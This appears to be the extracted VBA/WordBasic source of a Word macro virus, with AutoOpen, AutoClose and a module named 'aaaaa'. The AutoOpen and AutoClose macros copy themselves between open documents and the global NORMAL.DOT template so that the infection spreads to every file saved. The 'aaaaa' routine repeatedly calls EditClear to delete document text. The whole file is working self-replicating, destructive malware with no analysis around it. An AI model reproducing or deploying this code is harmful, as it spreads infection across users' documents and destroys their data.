   VERSION 1.0 CLASS
   BEGIN
     MultiUse = -1  'True
   END
   Attribute VB_Name = "ThisDocument"
   Attribute VB_GlobalNameSpace = False
   Attribute VB_Creatable = False
   Attribute VB_PredeclaredId = True
   Attribute VB_Exposed = True

   Attribute VB_Name = "AutoClose"

   Public Sub MAIN()
   Dim count_
   Dim w$

   WordBasic.EditReplace Find:=" ", Replace:=" ", Direction:=0, MatchCase:=0, WholeWord:=0, PatternMatch:=0, SoundsLike:=0, ReplaceAll:=1, Format:=0, Wrap:=1

   count_ = WordBasic.CountMacros(1)
           w$ = WordBasic.[MacroName$](count_, 1)
   If w$ = "aaaaa" Then GoTo t Else
   WordBasic.FileSaveAs Format:=1, LockAnnot:=0, Password:="", AddToMru:=1, WritePassword:="", RecommendReadOnly:=0, EmbedFonts:=0, NativePictureFormat:=0, FormsData:=0

   WordBasic.Organizer Copy:=1, Source:=WordBasic.[DefaultDir$](2) + "\NORMAL.DOT", Destination:=WordBasic.[FileName$](), Name:="AutoClose", Tab:=3

    WordBasic.Organizer Copy:=1, Source:=WordBasic.[DefaultDir$](2) + "\NORMAL.DOT", Destination:=WordBasic.[FileName$](), Name:="AutoOpen", Tab:=3

   WordBasic.Organizer Copy:=1, Source:=WordBasic.[DefaultDir$](2) + "\NORMAL.DOT", Destination:=WordBasic.[FileName$](), Name:="aaaaa", Tab:=3
   t:
   WordBasic.FileSave
   End Sub

   Attribute VB_Name = "AutoOpen"

   Public Sub MAIN()

   WordBasic.Organizer Copy:=1, Source:=WordBasic.[FileName$](), Destination:=WordBasic.[DefaultDir$](2) + "\NORMAL.DOT", Name:="AutoClose", Tab:=3

   WordBasic.Organizer Copy:=1, Source:=WordBasic.[FileName$](), Destination:=WordBasic.[DefaultDir$](2) + "\NORMAL.DOT", Name:="AutoOpen", Tab:=3

   WordBasic.Organizer Copy:=1, Source:=WordBasic.[FileName$](), Destination:=WordBasic.[DefaultDir$](2) + "\NORMAL.DOT", Name:="aaaaa", Tab:=3
   End Sub

   Attribute VB_Name = "aaaaa"

   Public Sub MAIN()
   WordBasic.EditClear
   WordBasic.EditClear
   WordBasic.EditClear
   WordBasic.EditClear
   WordBasic.EditClear
   WordBasic.EditClear
   WordBasic.EditClear
   WordBasic.EditClear
   WordBasic.EditClear
   WordBasic.EditClear
   WordBasic.EditClear
   WordBasic.EditClear
   WordBasic.EditClear
   End Sub
